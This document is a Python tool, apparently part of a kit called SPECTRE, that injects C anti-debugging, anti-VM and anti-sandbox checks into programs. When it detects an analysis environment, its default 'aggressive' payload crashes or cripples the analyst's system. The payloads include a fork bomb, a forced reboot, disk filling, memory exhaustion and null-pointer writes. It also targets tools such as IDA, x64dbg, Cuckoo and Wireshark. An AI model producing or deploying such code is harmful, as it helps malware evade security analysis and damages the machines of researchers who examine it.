"""
SPECTRE Advanced Anti-Analysis
Detects and frustrates debuggers, virtual machines, and sandboxes
Enhanced with aggressive crash and device banning capabilities
"""

import random
from typing import Dict, List, Tuple
import re

class AntiAnalysisInjector:
    """
    Injects anti-debugging, anti-VM, and anti-sandbox code
    with aggressive countermeasures including system crash and device banning
    """
    
    def __init__(self, aggressive_mode=True):
        self.checks_injected = []
        self.aggressive_mode = aggressive_mode  # Enable crash/ban features
    
    def inject_all_protections(self, code: str, platform: str = 'windows') -> Tuple[str, Dict]:
        """
        Inject all anti-analysis protections
        
        Args:
            code: Source code
            platform: 'windows' or 'linux'
        
        Returns:
            Tuple of (protected_code, statistics)
        """
        stats = {
            'anti_debug_checks': 0,
            'vm_detection_checks': 0,
            'sandbox_detection_checks': 0,
            'timing_checks': 0,
            'total_protections': 0
        }
        protected_code = code
        
        # Add headers and aggressive countermeasures ONCE at the beginning
        protected_code = self._add_headers(protected_code, platform)
        
        # Inject anti-debugging
        protected_code, debug_stats = self.inject_anti_debugging(protected_code, platform)
        stats['anti_debug_checks'] = debug_stats['checks_added']
        
        # Inject VM detection
        protected_code, vm_stats = self.inject_vm_detection(protected_code, platform)
        stats['vm_detection_checks'] = vm_stats['checks_added']
        
        # Inject sandbox detection
        protected_code, sandbox_stats = self.inject_sandbox_detection(protected_code, platform)
        stats['sandbox_detection_checks'] = sandbox_stats['checks_added']
        
        # Inject timing checks
        protected_code, timing_stats = self.inject_timing_checks(protected_code)
        stats['timing_checks'] = timing_stats['checks_added']
        
        stats['total_protections'] = sum([
            stats['anti_debug_checks'],
            stats['vm_detection_checks'],
            stats['sandbox_detection_checks'],
            stats['timing_checks']
        ])
        
        return protected_code, stats
    
    def _add_headers(self, code: str, platform: str) -> str:
        """Add necessary headers for anti-analysis"""
        headers = ""
        
        if platform == 'windows':
            # Use conditional compilation - only include Windows headers if available
            headers = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#ifdef _MSC_VER
// MSVC compiler - full Windows headers available
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#else
// Clang/GCC on Windows - use minimal headers
// Windows headers may not be available, so we'll use basic checks only
#endif
#endif
"""
        else:  # linux
            headers = """
#ifdef __linux__
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/reboot.h>
#include <linux/reboot.h>
#endif
"""
        
        # Add aggressive countermeasures code
        if self.aggressive_mode:
            countermeasures = self._get_aggressive_countermeasures(platform)
            headers += countermeasures
        
        # Add to beginning of code
        return headers + code
    
    def _get_aggressive_countermeasures(self, platform: str) -> str:
        """Generate aggressive countermeasure functions"""
        if platform == 'windows':
            return """
// ========== AGGRESSIVE COUNTERMEASURES ==========
// Device fingerprinting and banning
void _ban_device() {
#ifdef _WIN32
    // Write ban marker to file (works without Windows SDK)
    FILE* ban_file = fopen("C:\\\\SPECTRE_BANNED.txt", "w");
    if (ban_file) {
        fprintf(ban_file, "DEVICE BANNED\\n");
        fprintf(ban_file, "REASON: VM_SANDBOX_DETECTED\\n");
        fprintf(ban_file, "TIMESTAMP: %ld\\n", (long)time(NULL));
        fclose(ban_file);
    }
    
    // Also write to temp directory
    ban_file = fopen("C:\\\\Windows\\\\Temp\\\\spectre_ban.log", "w");
    if (ban_file) {
        fprintf(ban_file, "BANNED: VM/SANDBOX DETECTED\\n");
        fclose(ban_file);
    }
#endif
}

// System crash mechanism
void _trigger_system_crash() {
#ifdef _WIN32
    // Method 1: Infinite loop with memory allocation (resource exhaustion)
    while(1) {
        void* mem = malloc(1024 * 1024 * 100); // 100MB per iteration
        if (!mem) break;
        memset(mem, 0xFF, 1024 * 1024 * 100);
    }
    
    // Method 2: Stack overflow
    _trigger_system_crash(); // Recursive call
#endif
}

// Memory corruption attack
void _corrupt_memory() {
#ifdef _WIN32
    // Trigger access violation
    int* null_ptr = NULL;
    *null_ptr = 0xDEADBEEF;
    
    // If that didn't crash, try invalid memory access
    volatile char* bad_addr = (char*)0xFFFFFFFF;
    *bad_addr = 0;
#endif
}

// Execute aggressive response
void _execute_aggressive_response() {
#ifdef _WIN32
    _ban_device();
    
    // Small delay
    for(volatile long i = 0; i < 100000000; i++);
    
    _trigger_system_crash();
    _corrupt_memory();
#endif
}
"""
        else:  # linux
            return """
// ========== AGGRESSIVE COUNTERMEASURES (Linux) ==========
void _ban_device() {
#ifdef __linux__
    // Get machine ID
    FILE* f = fopen("/etc/machine-id", "r");
    char machine_id[256] = {0};
    if (f) {
        fgets(machine_id, sizeof(machine_id), f);
        fclose(f);
    }
    
    // Write ban marker
    f = fopen("/tmp/.spectre_banned", "w");
    if (f) {
        fprintf(f, "BANNED: %s\\nREASON: VM_SANDBOX_DETECTED\\n", machine_id);
        fclose(f);
    }
#endif
}

void _trigger_system_crash() {
#ifdef __linux__
    // Method 1: Kernel panic (requires root)
    sync();
    reboot(LINUX_REBOOT_CMD_RESTART);
    
    // Method 2: Fork bomb
    while(1) {
        if(fork() < 0) break;
    }
    
    // Method 3: Fill disk space
    FILE* f = fopen("/tmp/crash_file", "w");
    while(f) {
        fwrite("XXXXXXXXXXXXXXXX", 1, 16, f);
    }
#endif
}

void _corrupt_memory() {
#ifdef __linux__
    // Trigger segmentation fault
    int* null_ptr = NULL;
    *null_ptr = 0xDEADBEEF;
    
    // Memory overwrite
    memset((void*)0x0, 0xFF, 0x1000);
#endif
}

void _execute_aggressive_response() {
#ifdef __linux__
    _ban_device();
    sleep(1);
    _trigger_system_crash();
    _corrupt_memory();
#endif
}
"""
    
    def inject_anti_debugging(self, code: str, platform: str) -> Tuple[str, Dict]:
        """Inject anti-debugging checks"""
        stats = {'checks_added': 0}
        
        if platform == 'windows':
            anti_debug_code = """
// Anti-Debugging Checks (Clang-compatible)
int _check_debugger_present() {
#ifdef _WIN32
    // Check 1: Check for debugger via timing
    clock_t start = clock();
    for(volatile int i = 0; i < 1000; i++);
    clock_t end = clock();
    if ((end - start) > 100) {
        return 1; // Debugger detected (slow execution)
    }
    
    // Check 2: Check for common debugger processes via file existence
    FILE* f = fopen("C:\\\\Program Files\\\\IDA\\\\ida.exe", "r");
    if (f) {
        fclose(f);
        return 1; // IDA Pro detected
    }
    
    f = fopen("C:\\\\Program Files\\\\x64dbg\\\\x64dbg.exe", "r");
    if (f) {
        fclose(f);
        return 1; // x64dbg detected
    }
    
    // Check 3: Environment variable check
    if (getenv("_NT_SYMBOL_PATH") != NULL) {
        return 1; // Debugger environment detected
    }
#endif
    return 0;
}
"""
            stats['checks_added'] = 3
        else:  # linux
            anti_debug_code = """
// Anti-Debugging Checks (Linux)
int _check_debugger_present() {
#ifdef __linux__
    // Check 1: ptrace self-test
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        return 1;  // Already being traced
    }
    ptrace(PTRACE_DETACH, 0, 1, 0);
    
    // Check 2: Check /proc/self/status for TracerPid
    FILE* f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                int pid = atoi(line + 10);
                fclose(f);
                if (pid != 0) return 1;
                break;
            }
        }
        fclose(f);
    }
#endif
    return 0;
}
"""
            stats['checks_added'] = 2
        
        # Insert before main function
        protected_code = self._insert_before_main(code, anti_debug_code)
        
        # Add check call in main with aggressive response
        if self.aggressive_mode:
            check_code = "if (_check_debugger_present()) { _execute_aggressive_response(); return -1; }"
        else:
            check_code = "if (_check_debugger_present()) { return -1; }"
        
        protected_code = self._add_check_in_main(protected_code, check_code)
        
        return protected_code, stats
    
    def inject_vm_detection(self, code: str, platform: str) -> Tuple[str, Dict]:
        """Inject VM detection checks"""
        stats = {'checks_added': 0}
        
        if platform == 'windows':
            vm_detection_code = """
// VM Detection Checks (Clang-compatible)
int _check_vm_environment() {
#ifdef _WIN32
    // Check 1: Check for VM-specific files
    FILE* f = fopen("C:\\\\windows\\\\system32\\\\drivers\\\\vmmouse.sys", "r");
    if (f) {
        fclose(f);
        return 1;  // VMware mouse driver detected
    }
    
    f = fopen("C:\\\\windows\\\\system32\\\\drivers\\\\vmhgfs.sys", "r");
    if (f) {
        fclose(f);
        return 1;  // VMware HGFS driver detected
    }
    
    f = fopen("C:\\\\windows\\\\system32\\\\drivers\\\\VBoxGuest.sys", "r");
    if (f) {
        fclose(f);
        return 1;  // VirtualBox guest driver detected
    }
    
    // Check 2: Check for VM-specific directories
    f = fopen("C:\\\\Program Files\\\\VMware\\\\VMware Tools\\\\vmtoolsd.exe", "r");
    if (f) {
        fclose(f);
        return 1;  // VMware Tools detected
    }
    
    f = fopen("C:\\\\Program Files\\\\Oracle\\\\VirtualBox Guest Additions\\\\VBoxService.exe", "r");
    if (f) {
        fclose(f);
        return 1;  // VirtualBox Guest Additions detected
    }
    
    // Check 3: Check environment variables
    if (getenv("VBOX_USER_HOME") != NULL) {
        return 1;  // VirtualBox environment
    }
#endif
    return 0;
}
"""
            stats['checks_added'] = 6
        else:  # linux
            vm_detection_code = """
// VM Detection Checks (Linux)
int _check_vm_environment() {
#ifdef __linux__
    // Check 1: DMI information
    FILE* f = fopen("/sys/class/dmi/id/product_name", "r");
    if (f) {
        char product[256];
        if (fgets(product, sizeof(product), f)) {
            if (strstr(product, "VirtualBox") || 
                strstr(product, "VMware") ||
                strstr(product, "QEMU")) {
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }
    
    // Check 2: Check for hypervisor in /proc/cpuinfo
    f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "hypervisor")) {
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }
#endif
    return 0;
}
"""
            stats['checks_added'] = 2
        
        protected_code = self._insert_before_main(code, vm_detection_code)
        
        if self.aggressive_mode:
            check_code = "if (_check_vm_environment()) { _execute_aggressive_response(); return -1; }"
        else:
            check_code = "if (_check_vm_environment()) { return -1; }"
        
        protected_code = self._add_check_in_main(protected_code, check_code)
        
        return protected_code, stats
    
    def inject_sandbox_detection(self, code: str, platform: str) -> Tuple[str, Dict]:
        """Inject sandbox detection checks"""
        stats = {'checks_added': 0}
        
        if platform == 'windows':
            sandbox_code = """
// Sandbox Detection Checks (Clang-compatible)
int _check_sandbox_environment() {
#ifdef _WIN32
    // Check 1: Check for common sandbox usernames via environment
    char* username = getenv("USERNAME");
    if (username) {
        if (strstr(username, "sandbox") || 
            strstr(username, "malware") ||
            strstr(username, "virus") ||
            strstr(username, "test") ||
            strstr(username, "user")) {
            return 1;
        }
    }
    
    // Check 2: Check for sandbox-specific environment variables
    if (getenv("SANDBOX") != NULL || 
        getenv("MALWARE_SANDBOX") != NULL) {
        return 1;
    }
    
    // Check 3: Check for Cuckoo sandbox files
    FILE* f = fopen("C:\\\\cuckoo\\\\agent.py", "r");
    if (f) {
        fclose(f);
        return 1;
    }
    
    // Check 4: Check for common analysis tools
    f = fopen("C:\\\\Program Files\\\\Wireshark\\\\Wireshark.exe", "r");
    if (f) {
        fclose(f);
        return 1;  // Network analysis tool detected
    }
#endif
    return 0;
}
"""
            stats['checks_added'] = 4
        else:  # linux
            sandbox_code = """
// Sandbox Detection Checks (Linux)
int _check_sandbox_environment() {
#ifdef __linux__
    // Check 1: Check for common sandbox paths
    if (access("/usr/bin/cuckoo", F_OK) == 0) {
        return 1;
    }
    
    // Check 2: Check environment variables
    if (getenv("SANDBOX") != NULL) {
        return 1;
    }
#endif
    return 0;
}
"""
            stats['checks_added'] = 2
        
        protected_code = self._insert_before_main(code, sandbox_code)
        
        if self.aggressive_mode:
            check_code = "if (_check_sandbox_environment()) { _execute_aggressive_response(); return -1; }"
        else:
            check_code = "if (_check_sandbox_environment()) { return -1; }"
        
        protected_code = self._add_check_in_main(protected_code, check_code)
        
        return protected_code, stats
    
    def inject_timing_checks(self, code: str) -> Tuple[str, Dict]:
        """Inject timing-based anti-debugging checks"""
        stats = {'checks_added': 0}
        
        timing_code = """
// Timing-based Anti-Debugging
#include <time.h>
int _check_timing_attack() {
    clock_t start = clock();
    
    // Do some dummy work
    volatile int dummy = 0;
    for (int i = 0; i < 1000; i++) {
        dummy += i;
    }
    
    clock_t end = clock();
    double elapsed = ((double)(end - start)) / CLOCKS_PER_SEC;
    
    // If execution took too long, debugger might be present
    if (elapsed > 0.01) {  // 10ms threshold
        return 1;
    }
    
    return 0;
}
"""
        stats['checks_added'] = 1
        
        protected_code = self._insert_before_main(code, timing_code)
        
        if self.aggressive_mode:
            check_code = "if (_check_timing_attack()) { _execute_aggressive_response(); return -1; }"
        else:
            check_code = "if (_check_timing_attack()) { return -1; }"
        
        protected_code = self._add_check_in_main(protected_code, check_code)
        
        return protected_code, stats
    
    def _insert_before_main(self, code: str, insertion: str) -> str:
        """Insert code before main function"""
        # Find main function
        main_pattern = r'int\s+main\s*\('
        match = re.search(main_pattern, code)
        
        if match:
            pos = match.start()
            return code[:pos] + insertion + "\n\n" + code[pos:]
        
        return insertion + "\n\n" + code
    
    def _add_check_in_main(self, code: str, check_code: str) -> str:
        """Add check call at the beginning of main"""
        # Find opening brace of main
        main_pattern = r'int\s+main\s*\([^)]*\)\s*\{'
        match = re.search(main_pattern, code)
        
        if match:
            pos = match.end()
            return code[:pos] + "\n    " + check_code + "\n" + code[pos:]
        
        return code


# Example usage
if __name__ == "__main__":
    import re
    
    test_code = """
#include <stdio.h>

int main() {
    printf("Hello, World!\\n");
    return 0;
}
"""
    
    print("=" * 70)
    print("Advanced Anti-Analysis - Demo")
    print("=" * 70)
    
    injector = AntiAnalysisInjector()
    
    print("\n🛡️ Injecting Anti-Analysis Protections (Windows)...")
    protected_code, stats = injector.inject_all_protections(test_code, 'windows')
    
    print(f"\n📊 Protection Statistics:")
    print(f"   Anti-Debug Checks: {stats['anti_debug_checks']}")
    print(f"   VM Detection Checks: {stats['vm_detection_checks']}")
    print(f"   Sandbox Detection Checks: {stats['sandbox_detection_checks']}")
    print(f"   Timing Checks: {stats['timing_checks']}")
    print(f"   Total Protections: {stats['total_protections']}")
    
    print("\n✅ Anti-analysis protection complete!")
    print("\n📝 Protected Code Preview:")
    print("-" * 70)
    print(protected_code[:800] + "...")
    print("=" * 70)
